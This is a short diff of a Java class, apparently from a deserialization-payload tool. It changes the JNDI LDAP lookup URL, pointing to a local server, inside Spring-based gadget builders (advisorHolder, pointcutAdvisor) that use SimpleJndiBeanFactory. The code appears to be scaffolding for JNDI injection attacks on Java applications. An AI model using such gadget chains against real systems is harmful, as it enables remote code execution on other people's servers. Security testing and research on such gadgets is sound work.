@@ -25,7 +25,7 @@ public class SpringBased {
     }
 
     public static Object advisorHolder() throws Exception {
-        String url = "ldap://127.0.0.1:50389/d64c0c";
+        String url = "ldap://127.0.0.1:50389/9fb388";
         SimpleJndiBeanFactory simpleJndiBeanFactory = new SimpleJndiBeanFactory();
         Set<String> set = new HashSet<String>();
         set.add("any");
@@ -57,7 +57,7 @@ public class SpringBased {
     }
 
     public static Object pointcutAdvisor() throws Exception {
-        String url = "ldap://127.0.0.1:50389/d64c0c";
+        String url = "ldap://127.0.0.1:50389/9fb388";
         SimpleJndiBeanFactory simpleJndiBeanFactory = new SimpleJndiBeanFactory();
         Set<String> set = new HashSet<String>();
         set.add(url);
